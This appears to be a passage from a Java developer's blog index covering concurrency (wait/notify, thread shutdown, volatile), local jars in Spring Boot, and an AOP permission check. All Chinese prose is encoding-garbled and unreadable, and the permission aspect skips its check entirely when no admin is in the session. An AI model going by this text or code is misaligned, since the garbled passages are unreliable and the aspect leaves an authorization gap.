</li><li>ËôΩÁÑ∂synchronizedÂÖ≥ÈîÆÂ≠óÊâÄ‰øÆÈ•∞ÁöÑÂêåÊ≠•ÊñπÊ≥ï‰πüÂèØ‰ª•‰øùËØÅÈ°∫Â∫èÊÄß,‰ΩÜÊòØËøôÁßçÈ°∫Â∫èÊÄßÊòØ‰ª•Á®ãÂ∫èÁöÑ‰∏≤Ë°åÂåñÊç¢Êù•ÁöÑ,Âú®synchronizedÂÖ≥ÈîÆÂ≠óÊâÄ‰øÆÈ•∞ÁöÑ‰ª£Á†ÅÂùó‰∏≠‰ª£Á†ÅÂùó‰ª£Á†ÅÊåá‰ª§‰πüÂèëÁîüÊåá‰ª§ÈáçÊéíÂ∫èÁöÑÊÉÖÂÜµ </li></ul></li><li><p>ÂÖ∂‰ªñ </p><ul><li>volatile‰∏ç‰ºö‰ΩøÁ∫øÁ®ãÈô∑ÂÖ•ÈòªÂ°û </li><li>synchronizedÂÖ≥ÈîÆÂ≠ó‰ºö‰ΩøÁ∫øÁ®ãËøõÂÖ•ÈòªÂ°ûÁä∂ÊÄÅ. </li></ul></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂπ∂Âèë </tag>
            
            <tag> voliate </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>springbootÂØºÂÖ•Êú¨Âú∞jarÂåÖ</title>
      <link href="/2019/08/15/springboot%E5%AF%BC%E5%85%A5%E6%9C%AC%E5%9C%B0jar%E5%8C%85/"/>
      <url>/2019/08/15/springboot%E5%AF%BC%E5%85%A5%E6%9C%AC%E5%9C%B0jar%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<h3 id="springbootÂØºÂÖ•Êú¨Âú∞jarÂåÖ"><a href="#springbootÂØºÂÖ•Êú¨Âú∞jarÂåÖ" class="headerlink" title="springbootÂØºÂÖ•Êú¨Âú∞jarÂåÖ"></a>springbootÂØºÂÖ•Êú¨Âú∞jarÂåÖ</h3><p>È¶ñÂÖàÂú®src‰∏ãÂª∫ÁõÆÂΩïlib,Âπ∂Â∞ÜÈúÄË¶ÅÁöÑÊú¨Âú∞jarÂåÖÊîæÂÖ•</p><p>Âú®pom.xml‰∏ã‰øÆÊîπÂ¶Ç‰∏ã</p><pre><code>&lt;!-- ÂØºÂÖ•‰∫ëÈ°øÊï∞ÊçÆÈ£éÊéßÁöÑjar --&gt;       &lt;dependency&gt;           &lt;groupId&gt;aliyun&lt;/groupId&gt;           &lt;artifactId&gt;aliyun-java-sdk-afs&lt;/artifactId&gt;           &lt;version&gt;1.0.0&lt;/version&gt;           &lt;scope&gt;system&lt;/scope&gt;           &lt;systemPath&gt;${basedir}/src/lib/aliyun-java-sdk-afs-1.0.0.jar&lt;/systemPath&gt;       &lt;/dependency&gt;       &lt;dependency&gt;           &lt;groupId&gt;aliyun&lt;/groupId&gt;           &lt;artifactId&gt;aliyun-java-sdk-core&lt;/artifactId&gt;           &lt;version&gt;3.0.6&lt;/version&gt;           &lt;scope&gt;system&lt;/scope&gt;           &lt;systemPath&gt;${basedir}/src/lib/aliyun-java-sdk-core-3.0.6.jar&lt;/systemPath&gt;       &lt;/dependency&gt;       &lt;!-- ÂØºÂÖ•‰∫ëÈ°øÊï∞ÊçÆÈ£éÊéßÁöÑjar END--&gt;</code></pre><h3 id="ÊâìÂåÖ"><a href="#ÊâìÂåÖ" class="headerlink" title="ÊâìÂåÖ"></a>ÊâìÂåÖ</h3><p>‰øÆÊîπplugin‰∏≠,Ê∑ªÂä†ÈÖçÁΩÆ <code>&lt;includeSystemScope&gt;true&lt;/includeSystemScope&gt;</code></p><pre><code>&lt;build&gt;    &lt;plugins&gt;        &lt;plugin&gt;            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;            &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;            &lt;configuration&gt;                &lt;includeSystemScope&gt;true&lt;/includeSystemScope&gt;            &lt;/configuration&gt;        &lt;/plugin&gt;    &lt;/plugins&gt;&lt;/build&gt;</code></pre><h3 id="ÂèØËÉΩÂá∫Áé∞ÁöÑwarning"><a href="#ÂèØËÉΩÂá∫Áé∞ÁöÑwarning" class="headerlink" title="ÂèØËÉΩÂá∫Áé∞ÁöÑwarning"></a>ÂèØËÉΩÂá∫Áé∞ÁöÑwarning</h3><pre><code>[WARNING] Some problems were encountered while building the effective model for com.seniortech:beauty-hair-cms:jar:1.0.0[WARNING] &apos;dependencies.dependency.systemPath&apos; for aliyun:aliyun-java-sdk-afs:jar should not point at files within the project directory, ${basedir}/src/lib/aliyun-java-sdk-afs-1.0.0.jar will be unresolvable by dependent projects @ line 111, column 25[WARNING] &apos;dependencies.dependency.systemPath&apos; for aliyun:aliyun-java-sdk-core:jar should not point at files within the project directory, ${basedir}/src/lib/aliyun-java-sdk-core-3.0.6.jar will be unresolvable by dependent projects @ line 118, column 25[WARNING] [WARNING] It is highly recommended to fix these problems because they threaten the stability of your build.</code></pre><p><a href="https://gitlab.com/ltog/xtfvt/issues/5" target="_blank" rel="noopener"> Ëß£ÂÜ≥ÊñπÊ≥ï,Use ${pom.basedir} instead of ${project.basedir}.</a></p><h4 id="‰øÆÊîπÂêéÁöÑpom"><a href="#‰øÆÊîπÂêéÁöÑpom" class="headerlink" title="‰øÆÊîπÂêéÁöÑpom"></a>‰øÆÊîπÂêéÁöÑpom</h4><pre><code>&lt;!-- ÂØºÂÖ•‰∫ëÈ°øÊï∞ÊçÆÈ£éÊéßÁöÑjar --&gt;     &lt;dependency&gt;         &lt;groupId&gt;aliyun&lt;/groupId&gt;         &lt;artifactId&gt;aliyun-java-sdk-afs&lt;/artifactId&gt;         &lt;version&gt;1.0.0&lt;/version&gt;         &lt;scope&gt;system&lt;/scope&gt;         &lt;systemPath&gt;${pom.basedir}/src/lib/aliyun-java-sdk-afs-1.0.0.jar&lt;/systemPath&gt;     &lt;/dependency&gt;     &lt;dependency&gt;         &lt;groupId&gt;aliyun&lt;/groupId&gt;         &lt;artifactId&gt;aliyun-java-sdk-core&lt;/artifactId&gt;         &lt;version&gt;3.0.6&lt;/version&gt;         &lt;scope&gt;system&lt;/scope&gt;         &lt;systemPath&gt;${pom.basedir}/src/lib/aliyun-java-sdk-core-3.0.6.jar&lt;/systemPath&gt;     &lt;/dependency&gt;     &lt;!-- ÂØºÂÖ•‰∫ëÈ°øÊï∞ÊçÆÈ£éÊéßÁöÑjar END--&gt;</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> maven </tag>
            
            <tag> ÊâìÂåÖ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Á∫øÁ®ãÈÄö‰ø°</title>
      <link href="/2019/07/16/%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1/"/>
      <url>/2019/07/16/%E7%BA%BF%E7%A8%8B%E9%80%9A%E4%BF%A1/</url>
      
        <content type="html"><![CDATA[<h3 id="Á∫øÁ®ãÈó¥ÈÄö‰ø°"><a href="#Á∫øÁ®ãÈó¥ÈÄö‰ø°" class="headerlink" title="Á∫øÁ®ãÈó¥ÈÄö‰ø°"></a>Á∫øÁ®ãÈó¥ÈÄö‰ø°</h3><blockquote><p>Á∫øÁ®ãÈó¥ÈÄö‰ø°‰ºöÊúâ‰∏Ä‰∏™Â≠òÂÇ®‰ªªÂä°ÁöÑÈòüÂàó,ÈòüÂàóÊúâ‰ª•‰∏ã‰∏âÁßçÁä∂ÂÜµ</p></blockquote><ul><li>ÈòüÂàó‰∏∫Á©∫,‰ºöÈÄöÁü•Ê∂àË¥πËÄÖÁ≠âÂæÖ, </li><li>ÈòüÂàóÊª°Êó∂,‰ºöÈÄöÁü•Áîü‰∫ßËÄÖÁ≠âÂæÖ </li><li>ÈòüÂàóÊúâ‰ªªÂä°‰ΩÜ‰∏ç‰∏∫Á©∫,Ê∂àË¥πËÄÖÊ≠£Â∏∏ËøêË°å,Áîü‰∫ßËÄÖÊ≠£Â∏∏ËøêË°å </li></ul><h3 id="ÂçïÁ∫øÁ®ãÈÄö‰ø°-‰∏Ä‰∏™Áîü‰∫ßËÄÖ‰∏Ä‰∏™Ê∂àË¥πËÄÖ"><a href="#ÂçïÁ∫øÁ®ãÈÄö‰ø°-‰∏Ä‰∏™Áîü‰∫ßËÄÖ‰∏Ä‰∏™Ê∂àË¥πËÄÖ" class="headerlink" title="ÂçïÁ∫øÁ®ãÈÄö‰ø°(‰∏Ä‰∏™Áîü‰∫ßËÄÖ‰∏Ä‰∏™Ê∂àË¥πËÄÖ)"></a>ÂçïÁ∫øÁ®ãÈÄö‰ø°(‰∏Ä‰∏™Áîü‰∫ßËÄÖ‰∏Ä‰∏™Ê∂àË¥πËÄÖ)</h3><blockquote><p>‰ΩøÁî® <code>Object</code> ‰∏≠ÁöÑÊñπÊ≥ï, <code>wait()</code> Âíå <code>notify()</code> Êù•ÂÆûÁé∞</p><p><code>wait()</code></p></blockquote><ul><li><code>wait()</code> Âíå <code>notify()</code> ÂøÖÈ°ªËé∑ÂèñÂØπË±°,ÊâÄ‰ª•‰∏§‰∏™ÊñπÊ≥ïÈÉΩÈúÄË¶ÅÂú®ÂêåÊ≠•ÊñπÊ≥ï‰∏≠‰ΩøÁî®( <code>synchroized</code> ) </li><li>ÂΩìÂâçÁ∫øÁ®ãÊâßË°å‰∫ÜËØ•ÂØπË±°ÁöÑ <code>wait</code> ÊñπÊ≥ï‰πãÂêé,Â∞Ü‰ºöÊîæÂºÉÂØπËØ•monitorÁöÑÊâÄÊúâÊùÉÂπ∂‰∏îËøõÂÖ•‰∏éËØ•ÂØπË±°ÂÖ≥ËÅîÁöÑ <code>wait set</code> ‰∏≠,‰πüÂ∞±ÊòØËØ¥,‰∏ÄÊó¶ÂΩìÂâçÁ∫øÁ®ãÊâßË°å‰∫ÜÊüê‰∏™ <code>object</code> ÁöÑ <code>wait</code> ÊñπÊ≥ï‰πãÂêé,ÂÆÉÂ∞±‰ºöÈáäÊîæÂØπËØ•ÂØπË±°monitorÁöÑÊâÄÊúâÊùÉ,ÂÖ∂‰ªñÁ∫øÁ®ã‰πü‰ºöÊúâÊú∫‰ºöÁªßÁª≠‰∫âÂ§∫ËØ•monitorÁöÑÊâÄÊúâÊùÉ </li></ul><blockquote><p><code>notify()</code></p></blockquote><ul><li><code>notify()</code> ‰ºöÂî§ÈÜíÂçï‰∏™Ê≠£Âú®ÊâßË°åËØ•ÂØπË±°ÁöÑwaitÊñπÊ≥ïÁöÑÁ∫øÁ®ã </li><li>Âî§ÈÜíÁöÑÁ∫øÁ®ãÈúÄË¶ÅÈáçÊñ∞Ëé∑ÂèñÂØπËØ•ÂØπË±°ÊâÄÂÖ≥ËÅîmonitorÁöÑlockÊâçËÉΩÊâßË°å </li></ul><pre><code>import java.util.LinkedList;/** * EventQuque ‰ªªÂä°ÈòüÂàó,Êèê‰æõÊ∑ªÂä†‰ªªÂä°ÊñπÊ≥ï,Ê∂àË¥πÊñπÊ≥ï. * @author husky * @date 2019/7/12 11:21 */public class EventQueue {    private final int max;    static class Event{    }    private final LinkedList&lt;Event&gt; events = new LinkedList&lt;&gt;();    private final static Integer DEDAULT_MAX_EVENT = 10;    public EventQueue(int max) {        this.max = max;    }    public EventQueue(){        this(DEDAULT_MAX_EVENT);    }    public void offer(Event event){        synchronized (events){            if(events.size() &gt;= DEDAULT_MAX_EVENT){                try {                    console(&quot;the event list is full,wait consumer consume&quot;);                    events.wait();                } catch (InterruptedException e) {                    e.printStackTrace();                }            }            console(&quot;the event is submit&quot;);            events.addLast(event);            events.notify();        }    }    public void take(){        synchronized (events){            if(events.size() &lt;= 0){                try {                    console(&quot;the event list is empty,wait producer produce&quot;);                    events.wait();                } catch (InterruptedException e) {                    e.printStackTrace();                }            }            Event eventFirst  = events.getFirst();            events.removeFirst();            console(&quot;Event is &quot; + eventFirst + &quot;handler&quot;);            events.notify();        }    }    public static void console(String msg){        System.out.println(msg);    }}import java.util.concurrent.TimeUnit;/** * EventClient ‰ΩøÁî® * @author husky * @date 2019/7/12 11:44 */public class EventClient {    public static void main(String[] args) {        final EventQueue eventQueue = new EventQueue();        new Thread(()-&gt;{            for(;;){                eventQueue.offer(new EventQueue.Event());            }        },&quot;producer&quot;).start();        new Thread(()-&gt;{            for(;;){                eventQueue.take();                //Ê®°ÊãüÊ∂àË¥πeventÊ∂àËÄóÊó∂Èó¥                try {                    TimeUnit.MICROSECONDS.sleep(10);                } catch (InterruptedException e) {                    e.printStackTrace();                }            }        },&quot;consumer&quot;).start();    }</code></pre><h3 id="Â§öÁ∫øÁ®ãÈÄö‰ø°-Â§öÁîüÊàêËÄÖÂ§öÊ∂àË¥πËÄÖ"><a href="#Â§öÁ∫øÁ®ãÈÄö‰ø°-Â§öÁîüÊàêËÄÖÂ§öÊ∂àË¥πËÄÖ" class="headerlink" title="Â§öÁ∫øÁ®ãÈÄö‰ø°(Â§öÁîüÊàêËÄÖÂ§öÊ∂àË¥πËÄÖ)"></a>Â§öÁ∫øÁ®ãÈÄö‰ø°(Â§öÁîüÊàêËÄÖÂ§öÊ∂àË¥πËÄÖ)</h3><ul><li><code>notifyAll()</code> ÊñπÊ≥ïÂèØ‰ª•Âî§ÈÜíÁî±‰∫éË∞ÉÁî® <code>wait()</code> ÊñπÊ≥ïÈòªÂ°ûÁöÑÁ∫øÁ®ã, <code>notify()</code> ÂèØ‰ª•Âî§ÈÜíËµ∑‰∏Ä‰∏™Á∫øÁ®ã,ËÄå <code>notifyAll()</code> ÊòØÂî§ÈÜíÊâÄÊúâÈòªÂ°ûÁöÑÁ∫øÁ®ã,ÊâÄÊúâÁ∫øÁ®ãÈúÄË¶ÅÁ´û‰∫âmonitorÁöÑÈîÅ. </li></ul><pre><code>import java.util.LinkedList;/** * EventQueue ‰ªªÂä°ÈòüÂàó * @author husky * @date 2019/7/12 14:17 * Â§öÁ∫øÁ®ãÈó¥ÈÄö‰ø° */public class EventQueue {    private final int max;    static class Event{    }    private final LinkedList&lt;Event&gt; events = new LinkedList&lt;&gt;();    private final static Integer DEDAULT_MAX_EVENT = 10;    public EventQueue(int max) {        this.max = max;    }    public EventQueue(){        this(DEDAULT_MAX_EVENT);    }    public void offer(Event event){        synchronized (events){            while(events.size() &gt;= DEDAULT_MAX_EVENT){                try {                    console(&quot;the event list is full,wait consumer consume&quot;);                    events.wait();                } catch (InterruptedException e) {                    e.printStackTrace();                }            }            console(Thread.currentThread().getName()+&quot;the event is submit&quot;);            events.addLast(event);            events.notifyAll();        }    }    public void take(){        synchronized (events){            while(events.size() &lt;= 0){                try {                    console(&quot;the event list is empty,wait producer produce&quot;);                    events.wait();                } catch (InterruptedException e) {                    e.printStackTrace();                }            }            Event eventFirst  = events.getFirst();            events.removeFirst();            console(Thread.currentThread().getName()+&quot;Event is &quot; + eventFirst + &quot;handler&quot;);            events.notifyAll();        }    }    public static void console(String msg){        System.out.println(msg);    }}import java.util.concurrent.TimeUnit;import java.util.stream.IntStream;/** * @author husky * @date 2019/7/12 14:19 */public class EventClient {    public static void main(String[] args) {        final EventQueue eventQueue = new EventQueue();        IntStream.rangeClosed(0,2).mapToObj(i-&gt;new Thread(&quot;producer-&quot;+i){            @Override            public void run() {                for(;;) {                    eventQueue.offer(new EventQueue.Event());                }            }        }).forEach(Thread::start);        IntStream.rangeClosed(0,3).mapToObj(i-&gt;new Thread(&quot;consumer-&quot;+i){            @Override            public void run() {                for(;;){                    eventQueue.take();                    try {                        TimeUnit.MICROSECONDS.sleep(10);                    } catch (InterruptedException e) {                        e.printStackTrace();                    }                }            }        }).forEach(Thread::start);    }}</code></pre><blockquote><p>ÂÖ∂‰∏≠ÈúÄË¶ÅËß£ÈáäÁöÑÊòØ,‰∏∫‰ªÄ‰πàÂçïÁ∫øÁ®ãÈÄö‰ø°Âú®Âà§Êñ≠ÊòØÂê¶ÈòªÂ°ûÊó∂,‰ΩøÁî®if,ËÄåÂ§öÁ∫øÁ®ãÂà§Êñ≠‰ΩøÁî®while.Âõ†‰∏∫Â§ö‰∏™Âú®‰∏ÄËµ∑Êó∂,ÊúâÂèØËÉΩÂ§ö‰∏™ÂêåÊó∂ÈòªÂ°û,Ë¢´Âî§ÈÜíÊó∂,Â¶ÇÊûúÁî®ifÁöÑËØù,ÂæàÂ§öÊù°‰ª∂Âπ∂Ê≤°ÊúâÂÜçÊ¨°Âà§Êñ≠.</p><p>ËÄå‰ΩøÁî®whileÂèØ‰ª•Âú®ÊâßË°å <code>wait()</code> ‰πãÂêéÂÜçÊ¨°Âà§Êñ≠Êù°‰ª∂ÊòØÂê¶Ê≠£Á°Æ,ËøôÈáå‰πüÂ∞±ÁâµÊâØÂà∞wait setÁöÑ‰∫ãÊÉÖ</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂπ∂Âèë </tag>
            
            <tag> Á∫øÁ®ãÈÄö‰ø° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ÂÖ≥Èó≠Á∫øÁ®ã</title>
      <link href="/2019/07/12/%E5%85%B3%E9%97%AD%E7%BA%BF%E7%A8%8B/"/>
      <url>/2019/07/12/%E5%85%B3%E9%97%AD%E7%BA%BF%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂÖ≥Èó≠Á∫øÁ®ã"><a href="#ÂÖ≥Èó≠Á∫øÁ®ã" class="headerlink" title="ÂÖ≥Èó≠Á∫øÁ®ã"></a>ÂÖ≥Èó≠Á∫øÁ®ã</h3><h4 id="ÈÄöËøá-interruptionException-ÂÖ≥Èó≠"><a href="#ÈÄöËøá-interruptionException-ÂÖ≥Èó≠" class="headerlink" title="ÈÄöËøá interruptionException ÂÖ≥Èó≠"></a>ÈÄöËøá <code>interruptionException</code> ÂÖ≥Èó≠</h4><pre><code>import java.util.concurrent.TimeUnit;/** * @author husky * @date 2019/7/11 11:23 */public class CloseThreadByInterruptException {    public static void main(String[] args) {        Thread workThread = new Thread(){            @Override            public void run() {                System.out.println(&quot;i will start work&quot;);                for(;;){                    //working                    //‰ΩøÁî®Êó∂Èó¥Ê®°ÊãüÂ∑•‰Ωú                    long start = System.currentTimeMillis();                    long end = start + 1000 * 5;                    while(System.currentTimeMillis() &lt;= end){                        //do nothing                    }                    try{                        TimeUnit.MICROSECONDS.sleep(1);                    }catch (InterruptedException e){                        break;                    }                }                System.out.println(&quot;i will be exiting&quot;);            }        };        workThread.start();        try {            TimeUnit.SECONDS.sleep(1);        } catch (InterruptedException e) {            e.printStackTrace();        }        System.out.println(&quot;work thread will be closed&quot;);        workThread.interrupt();    }}</code></pre><h4 id="ÈÄöËøá-interrupt-status"><a href="#ÈÄöËøá-interrupt-status" class="headerlink" title="ÈÄöËøá interrupt status"></a>ÈÄöËøá <code>interrupt status</code></h4><pre><code>import java.util.concurrent.TimeUnit;/** * @author husky * @date 2019/7/11 11:16 */public class CloseThreadByInterruptStatus {    public static void main(String[] args) throws InterruptedException {        Thread t1 = new Thread(){            @Override            public void run() {                while(!isInterrupted()){                    //do something                }            }        };        t1.start();        // ensure thread is running        TimeUnit.SECONDS.sleep(1);        System.out.println(&quot;Thread will be closed&quot;);        t1.interrupt();    }}</code></pre><h4 id="ÈÄöËøá-volatile-Âíå-interrupt-status-ÂÖ≥Èó≠"><a href="#ÈÄöËøá-volatile-Âíå-interrupt-status-ÂÖ≥Èó≠" class="headerlink" title="ÈÄöËøá volatile Âíå interrupt status ÂÖ≥Èó≠"></a>ÈÄöËøá <code>volatile</code> Âíå <code>interrupt status</code> ÂÖ≥Èó≠</h4><pre><code>import java.util.concurrent.TimeUnit;/** * @author husky * @date 2019/7/11 11:39 */public class CloseThreadByVolatile {    static class WorkThread extends Thread{        private volatile boolean flag = false;        @Override        public void run() {            System.out.println(&quot;i will start work&quot;);            while(!flag&amp;&amp;!isInterrupted()){                //Ê≠£Âú®ÊâßË°å            }            System.out.println(&quot;i will be exiting&quot;);        }        public void close(){            this.flag = true;            this.interrupt();        }    }    public static void main(String[] args) {        WorkThread workThread = new WorkThread();        workThread.start();        try {            TimeUnit.SECONDS.sleep(1);        } catch (InterruptedException e) {            e.printStackTrace();        }        System.out.println(&quot;System will be interrupt&quot;);        workThread.close();    }}</code></pre><h3 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h3><blockquote><p>interrupt statusÂÆπÊòìË¢´Ê∏ÖÈô§,ÊâÄ‰ª•Êé®Ëçê‰ΩøÁî®voliateÂíåinterrupt statusÊ∑∑Âêà‰ΩøÁî®</p></blockquote><h3 id="ËØ•ÊñáÂ≠¶‰π†‰∫éÊ±™ÊñáÂêõÈ´òÂπ∂ÂèëÁºñÁ®ã"><a href="#ËØ•ÊñáÂ≠¶‰π†‰∫éÊ±™ÊñáÂêõÈ´òÂπ∂ÂèëÁºñÁ®ã" class="headerlink" title="ËØ•ÊñáÂ≠¶‰π†‰∫éÊ±™ÊñáÂêõÈ´òÂπ∂ÂèëÁºñÁ®ã"></a>ËØ•ÊñáÂ≠¶‰π†‰∫éÊ±™ÊñáÂêõÈ´òÂπ∂ÂèëÁºñÁ®ã</h3>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂπ∂Âèë </tag>
            
            <tag> thread </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aop+annotationÂÆûÁé∞ÊùÉÈôêÁÆ°ÁêÜ</title>
      <link href="/2019/06/24/aop+annotation%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/"/>
      <url>/2019/06/24/aop+annotation%E5%AE%9E%E7%8E%B0%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂäüËÉΩÈúÄÊ±Ç"><a href="#ÂäüËÉΩÈúÄÊ±Ç" class="headerlink" title="ÂäüËÉΩÈúÄÊ±Ç"></a>ÂäüËÉΩÈúÄÊ±Ç</h3><p>ÈÅáÂà∞‰∏Ä‰∏™ÈóÆÈ¢ò,Ë¶ÅÂÆûÁé∞ÊùÉÈôêÁÆ°ÁêÜ,‰πüÂ∞±ÊòØÊúâ‰∫õÊåâÈíÆÁÇπÂáªÊó∂Ë¶ÅÊèêÁ§∫,Ê≤°ÊúâÊùÉÈôê,ÊúâÂæàÂ§öÊé•Âè£,Â¶ÇÊûúË¶ÅÊòØÊåâÁÖßËÄÅÁöÑÊñπÂºè,Â∞±ÊòØÊØè‰∏™ÊñπÊ≥ïÈÉΩÊâãÂÜôÊùÉÈôêÂà§Êñ≠.ÂçÅÂàÜÊµ™Ë¥πÊó∂Èó¥</p><h3 id="ÈóÆÈ¢òÁöÑÈáçË¶ÅÁÇπ"><a href="#ÈóÆÈ¢òÁöÑÈáçË¶ÅÁÇπ" class="headerlink" title="ÈóÆÈ¢òÁöÑÈáçË¶ÅÁÇπ"></a>ÈóÆÈ¢òÁöÑÈáçË¶ÅÁÇπ</h3><ol><li>ÈáçÂ§çÁöÑÂ∑•‰Ωú,Â¶Ç‰ΩïËß£ÂÜ≥ </li><li>È°πÁõÆÂπ∂Ê≤°ÊúâÂºïÂÖ•shiro‰πãÁ±ªÁöÑÊ®°ÂùóËÄå‰∏îsessionÊòØ‰øùÂ≠òÂú®redis‰∏≠ÁöÑ,ÊâÄ‰ª•ÂàÜÂ∏ÉÂºèÁöÑÁéØÂ¢É‰πüÂèØ‰ΩøÁî®session,Â¶Ç‰Ωï‰ªésession‰∏≠Ëé∑ÂèñÁî®Êà∑‰ø°ÊÅØ </li></ol><h3 id="ËØù‰∏çÂ§öÂ∞ë-Áõ¥Êé•ËØ¥ÊÄé‰πàÂÅö"><a href="#ËØù‰∏çÂ§öÂ∞ë-Áõ¥Êé•ËØ¥ÊÄé‰πàÂÅö" class="headerlink" title="ËØù‰∏çÂ§öÂ∞ë,Áõ¥Êé•ËØ¥ÊÄé‰πàÂÅö"></a>ËØù‰∏çÂ§öÂ∞ë,Áõ¥Êé•ËØ¥ÊÄé‰πàÂÅö</h3><ol><li>ÈááÁî®aopÂÆûÁé∞ÈáçÂ§çÁöÑÊùÉÈôêÂà§Êñ≠ </li><li>Ê†πÊçÆRequestContextHolderËøô‰∏™Á±ªÂèØ‰ª•Ëé∑Âèñsession </li></ol><h2 id="PermissionÊ≥®Ëß£"><a href="#PermissionÊ≥®Ëß£" class="headerlink" title="PermissionÊ≥®Ëß£"></a>PermissionÊ≥®Ëß£</h2><pre><code>import java.lang.annotation.*;@Inherited@Retention(RetentionPolicy.RUNTIME)@Target({ElementType.METHOD})/** * Ê≠§Â§ÑÂú®‰ΩøÁî®Êó∂,ÂèØ‰ª•Âú®ÊñπÊ≥ï‰∏äÈù¢Âä†Ê≥®Ëß£ * example:   @Permission({&quot;/admin/hasPermission&quot;,&quot;/admin/isAlive&quot;}) * */public @interface Permission {    String[] value() default {};}</code></pre><h2 id="PermissionAop"><a href="#PermissionAop" class="headerlink" title="PermissionAop"></a>PermissionAop</h2><pre><code>import com.seniortech.test.annotation.Permission;import com.seniortech.test.entity.Admin;import com.seniortech.test.response.LayData;import com.seniortech.test.service.PermissionService;import org.aspectj.lang.ProceedingJoinPoint;import org.aspectj.lang.annotation.Around;import org.aspectj.lang.annotation.Aspect;import org.aspectj.lang.annotation.Pointcut;import org.springframework.context.annotation.Configuration;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.context.request.ServletRequestAttributes;import org.aspectj.lang.reflect.MethodSignature;import javax.annotation.Resource;import javax.servlet.http.HttpSession;import java.lang.reflect.Method;import java.util.Objects;/** * @author husky * @date 2019/6/24 17:46 */@Aspect@Configurationpublic class PermissionAop {    @Resource    private PermissionService permissionService;    // ÂÆö‰πâÂàáÁÇπPointcut    @Pointcut(value=&quot;@annotation(com.seniortech.test.annotation.Permission)&quot;)    public void excudeService(){    }    @Around(&quot;excudeService()&quot;)    public Object doAround(ProceedingJoinPoint proceedingJoinPoint) throws Throwable {        HttpSession session = ((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getRequest().getSession();        Admin admin =(Admin) session.getAttribute(&quot;admin&quot;);//‰∏äÈù¢‰∏§Ë°å‰ª£Á†ÅÂèØ‰ª•Ëé∑ÂèñÂà∞request,Âç≥ÂèØ‰ª•Ëé∑Âèñsession        if(!Objects.isNull(admin)){            System.out.println(admin);            MethodSignature ms = (MethodSignature) proceedingJoinPoint.getSignature();            Method method = ms.getMethod();            Permission permission = ((Method) method).getAnnotation(Permission.class);            String[] permissions = permission.value();//Ê≠§Â§ÑÂèØ‰ª•Ëé∑Âèñ@Permission‰∏≠ÁöÑÊ≥®Ëß£,Â≠óÁ¨¶‰∏≤Êï∞ÁªÑ            //ÂΩìÁÑ∂Ë¶ÅÂØπËøô‰∏™permissionsËøô‰∏™Âà§Êñ≠ÊòØÂê¶ÈïøÂ∫¶‰∏∫0,Êú¨‰ª£Á†Å‰∏≠Êú™Âà§Êñ≠ÊòØ‰∏ç‰∏•Ë∞®ÁöÑ            if(!permissionService.hasPermission(admin.getId(),permissions)){                return LayData.builder().code(-1).msg(&quot;Ê≤°ÊúâÊùÉÈôê&quot;).build();            }            //Ê≠§Â§ÑÁöÑLayDataÊòØresponseÁöÑÁªü‰∏ÄÊ†ºÂºè        }        Object result = proceedingJoinPoint.proceed();        return result;    }}</code></pre><h2 id="ÂâçÁ´ØajaxÂ§ÑÁöÑÂ∞ÅË£Ö‰ª£Á†Å"><a href="#ÂâçÁ´ØajaxÂ§ÑÁöÑÂ∞ÅË£Ö‰ª£Á†Å" class="headerlink" title="ÂâçÁ´ØajaxÂ§ÑÁöÑÂ∞ÅË£Ö‰ª£Á†Å"></a>ÂâçÁ´ØajaxÂ§ÑÁöÑÂ∞ÅË£Ö‰ª£Á†Å</h2><pre><code>/**             * ajaxÂ∞ÅË£Ö             * url ÂèëÈÄÅËØ∑Ê±ÇÁöÑÂú∞ÂùÄ             * data ÂèëÈÄÅÂà∞ÊúçÂä°Âô®ÁöÑÊï∞ÊçÆ,Êï∞ÁªÑÂ≠òÂÇ®,Â¶Ç: {&quot;date&quot;:new Date().getTime(),&quot;state&quot;:1}             * successfn ÊàêÂäüÂõûË∞ÉÂáΩÊï∞             * errorfn Â§±Ë¥•ÂõûË∞ÉÂáΩÊï∞             * */            jQuery.postAjax = function (url,data,successfn,errorfn) {                data = (data === null || data === &quot;&quot;                         || typeof (data) === &quot;undefined&quot;)                        ?{&quot;date&quot;:new Date().getTime()}:data;                var loadObj = layer.load(2);                $.ajax({                    type: &quot;post&quot;,                    data: data,                    url: url,                    success: function (d,textStatus,jqXHR) {                        layer.close(loadObj);                        if(d.code === -100){//ÁôªÂΩïÁä∂ÊÄÅÂ∑≤Â§±Êïà                            layer.confirm(&quot;ÁôªÂΩïÂ∑≤Â§±Êïà,ËØ∑ÈáçÊñ∞ÁôªÂΩï&quot;,                                    {icon:2,title: &apos;ÊèêÁ§∫&apos;,btn: [&apos;Á°ÆÂÆö&apos;],                                    closeBtn:0},function (index) {                                        window.location.href = &quot;/login.html&quot;;                                    })                            return;                        }                        if(d.code === -1) {//Êó†ÊùÉÊìç‰ΩúÊàñÊùÉÈôêË¢´Á¶Å                            console.log(&quot;Ê≤°ÊúâÊùÉÈôê&quot;);                            layer.msg(d.msg,{icon:0});                            return;                        }                        successfn(d);                    },                    error:function (e) {                        layer.close(loadObj);                        if(errorfn !== undefined){                            errorfn(e);                        }                    }                })            }</code></pre><h2 id="ÂêéÁ´ØË∞ÉÁî®‰ª£Á†Å"><a href="#ÂêéÁ´ØË∞ÉÁî®‰ª£Á†Å" class="headerlink" 